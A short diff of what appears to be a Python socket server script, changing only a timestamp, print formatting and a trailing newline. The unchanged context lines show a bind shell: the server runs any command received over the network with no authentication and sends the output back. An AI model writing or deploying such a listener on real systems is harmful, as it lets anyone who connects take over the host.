@@ -7,7 +7,7 @@
 #
 #        Version:  1.0
 #        Created:  2018-05-28 10:47:13
-#  Last Modified:  2018-05-29 10:26:57
+#  Last Modified:  2018-05-30 16:30:22
 #       Revision:  none
 #       Compiler:  gcc
 #
@@ -26,7 +26,7 @@ s.listen(1)
 
 while True:
     (conn, addr) = s.accept()
-    print ('connected by', addr)
+    print('connected by', addr)
     while True:
         data = conn.recv(1024)
         (cmd_status, cmd_result) = commands.getstatusoutput(data)
@@ -35,4 +35,3 @@ while True:
         else:
             conn.sendall(cmd_result)
 conn.close()
-
